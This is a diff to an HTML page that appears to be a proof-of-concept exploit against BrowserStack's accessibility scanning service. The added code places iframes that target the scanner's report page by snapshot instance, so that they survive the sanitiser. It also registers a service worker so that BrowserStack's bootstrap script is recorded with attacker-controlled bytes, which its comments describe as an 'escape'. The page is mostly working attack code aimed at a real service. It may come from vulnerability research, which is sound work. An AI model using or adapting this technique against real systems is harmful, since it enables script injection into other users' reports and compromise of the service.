@@ -1,35 +1,34 @@
-<!DOCTYPE html><html><head><title>a11y proxyMap mimetype battery</title>
+<!DOCTYPE html><html><head><title>C-39 end-to-end</title>
 <link rel="stylesheet" href="style.css">
 </head>
 <body>
-<h1 id="h1">mimetype battery</h1>
+<h1 id="h1">C-39 end-to-end (operator-owned page)</h1>
 <img src="own-asset.png" alt="">
-<iframe src="frameC.html" width="40" height="40" title="control frame"></iframe>
+<input type="text">
+<button>no label</button>
+
+<!-- THE ESCAPE: pure markup. No script, no event handler - nothing the snapshot sanitiser strips.
+     Absolute URL because the renderer rewrites <base href> to the scanned origin.
+     ?instance= names the report page's React useId()-derived snapshot instance. -->
+<iframe src="https://accessibility.browserstack.com/?instance=r7a" width="120" height="60" title="e1"></iframe>
+<iframe src="https://accessibility.browserstack.com/home?instance=r7a" width="120" height="60" title="e2"></iframe>
+<iframe src="https://accessibility.browserstack.com/?instance=r6u" width="120" height="60" title="e3"></iframe>
+
 <div id="dyn"></div>
-<button>no label</button><input type="text">
 <script>
 (async function () {
-  var A = 'https://accessibility.browserstack.com/';
   try {
     await navigator.serviceWorker.register('sw.js', { scope: './' });
     await navigator.serviceWorker.ready;
     for (var i = 0; i < 40 && !navigator.serviceWorker.controller; i++) await new Promise(function (r) { setTimeout(r, 100) });
-    var h = '';
-    h += '<link rel="stylesheet" href="' + A + 'mt-link-stylesheet.js">';
-    h += '<link rel="preload" as="script" href="' + A + 'mt-preload-script.js">';
-    h += '<link rel="modulepreload" href="' + A + 'mt-modulepreload.js">';
-    h += '<script src="' + A + 'mt-classic-script.js"><\/script>';
-    h += '<script type="module" src="' + A + 'mt-module-script.js"><\/script>';
-    h += '<img src="' + A + 'mt-img.js" alt="">';
-    h += '<iframe src="' + A + 'mt-iframe.js" width="30" height="30" title="mt-iframe"></iframe>';
-    h += '<video><source src="' + A + 'mt-video.js"></video>';
-    h += '<object data="' + A + 'mt-object.js" width="20" height="20"></object>';
-    h += '<link rel="prefetch" href="' + A + 'mt-prefetch.js">';
-    document.getElementById('dyn').innerHTML = h;
-    try { await fetch(A + 'mt-fetch.js') } catch (e) {}
-    try { var w = new Worker(A + 'mt-worker.js'); setTimeout(function () { try { w.terminate() } catch (e) {} }, 1500) } catch (e) {}
-    var d = document.createElement('div'); d.textContent = 'MT_BATTERY_DONE controller=' + !!navigator.serviceWorker.controller; document.body.appendChild(d);
-  } catch (e) { }
+    // Reference BrowserStack's bootstrap script ONLY once the SW controls this page, so the
+    // recorder's fetch is answered by the SW and the bytes stored under that key are ours.
+    document.getElementById('dyn').innerHTML =
+      '<link rel="stylesheet" href="https://static-assets.browserstack.com/accessibility/theme-loader.js">';
+    var d = document.createElement('div');
+    d.textContent = 'SW_CONTROLLED=' + !!navigator.serviceWorker.controller;
+    document.body.appendChild(d);
+  } catch (e) {}
 })();
 </script>
 </body></html>
